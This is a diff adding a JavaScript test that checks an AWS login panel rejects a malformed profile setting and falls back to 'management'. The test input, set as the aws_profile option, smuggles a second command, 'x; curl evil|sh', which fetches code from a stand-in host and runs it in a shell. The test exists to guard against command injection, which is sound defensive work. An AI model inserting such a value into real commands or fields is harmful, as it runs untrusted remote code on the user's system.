@@ -394,6 +394,16 @@ describe('the aws tab', () => {
     expect(shown).toContain('Queue login')
   })
 
+  test('a profile setting that is not a plain name falls back to management, in the queued command too', { options: { ...OPTIONS, aws_profile: 'x; curl evil|sh' } }, async ($, on) => {
+    mock.clock(on)
+    const w = world(on)
+    await start($, 'coordinator')
+    const shown = JSON.stringify(await $.ui.render(AWS))
+    expect(shown).not.toContain('curl')
+    await $.ui.press({ plugin: 'side-panel', key: 'aws-login' })
+    expect(w.called[0]).toMatchObject({ command: 'aws sso login --profile management' })
+  })
+
   test('the profile is a setting', { options: { ...OPTIONS, aws_profile: 'dev' } }, async ($, on) => {
     mock.clock(on)
     world(on)
